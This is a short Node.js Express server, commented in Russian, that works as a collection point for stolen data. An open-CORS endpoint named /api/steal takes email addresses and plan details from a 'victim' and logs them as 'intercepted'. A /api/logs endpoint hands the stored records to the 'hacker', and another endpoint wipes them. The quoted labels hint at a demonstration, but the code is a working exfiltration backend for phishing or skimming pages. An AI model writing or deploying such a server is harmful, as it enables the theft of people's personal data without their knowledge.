const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());

// Здесь будут храниться данные (в оперативной памяти)
let stolenData = [];

// Эндпоинт для получения данных от "жертвы"
app.post('/api/steal', (req, res) => {
    const { email, plan } = req.body;
    if (email) {
        stolenData.push({ 
            email, 
            plan: plan || 'Неизвестно', 
            time: new Date().toLocaleTimeString() 
        });
        console.log(`[!] ПЕРЕХВАЧЕНО: ${email}`);
    }
    res.status(200).send({ status: 'ok' });
});

// Эндпоинт для получения данных "хакером"
app.get('/api/logs', (req, res) => {
    res.json(stolenData);
});

// Очистка логов (чтобы не забивать память)
app.post('/api/clear', (req, res) => {
    stolenData = [];
    res.send({ status: 'cleared' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});